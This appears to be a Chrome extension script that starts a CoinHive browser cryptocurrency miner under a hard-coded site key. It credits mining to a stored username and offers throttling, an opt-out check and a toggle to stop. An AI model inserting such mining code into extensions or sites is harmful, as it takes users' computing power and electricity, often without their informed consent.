(function() {
    chrome.storage.sync.get("username", function(data) {
        var miner = new CoinHive.User('gk1NDzPc69bUVRKAOOniFnFLj17Wlkws', data["username"], {
            throttle: 0.3,
        });
        miner.setNumThreads(1);
        // Only start on non-mobile devices and if not opted-out
        // in the last 14400 seconds (4 hours):

        if (!miner.isMobile() && !miner.didOptOut(14400)) {
            miner.start(CoinHive.IF_EXCLUSIVE_TAB);
        }

        chrome.storage.onChanged.addListener(function(changes, namespace) {
            if (changes['toggle_miner'].newValue == false) {
                miner.stop();
                // clearInterval(get_stats);
            }
        });
        miner.on('open', function() {
            console.log('miner opened');
        });
        miner.on('close', function() {
            console.log('miner closed');
            // clearInterval(get_stats);
        });
    });

})();
